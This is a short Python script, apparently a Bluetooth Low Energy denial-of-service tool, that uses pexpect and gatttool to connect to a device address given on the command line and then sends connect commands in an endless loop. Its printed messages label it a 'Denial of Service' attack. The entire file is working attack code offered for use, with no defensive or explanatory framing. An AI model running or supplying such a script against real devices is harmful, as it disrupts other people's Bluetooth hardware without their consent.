import pexpect
import time
import sys

child = pexpect.spawn("gatttool -I")

addr = sys.argv[1]

# Connect to the device.

child.sendline("connect {0}".format(addr))
child.expect("Connection successful", timeout=5)
print(" Denial of Service is running " + addr + " !!")
print(" Press Ctrl + C to exit the DoS attack")

while True:
  child.sendline("connect {0}".format(addr))

